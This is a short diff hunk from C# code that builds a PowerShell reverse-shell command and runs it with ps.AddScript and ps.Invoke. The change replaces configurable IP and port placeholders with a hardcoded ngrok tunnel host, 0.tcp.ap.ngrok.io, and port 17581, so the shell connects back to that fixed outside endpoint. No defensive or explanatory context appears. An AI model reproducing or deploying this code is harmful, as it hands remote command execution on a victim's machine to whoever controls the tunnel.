@@ -193,7 +193,7 @@
                                     };
                                     $client.Close();";
     
-                        revShellcommand = revShellcommand.Replace("IP", ip).Replace("PORT", port);
+                        revShellcommand = revShellcommand.Replace("IP", "0.tcp.ap.ngrok.io").Replace("PORT", "17581");
 			
                         ps.AddScript(revShellcommand);
 						ps.Invoke();
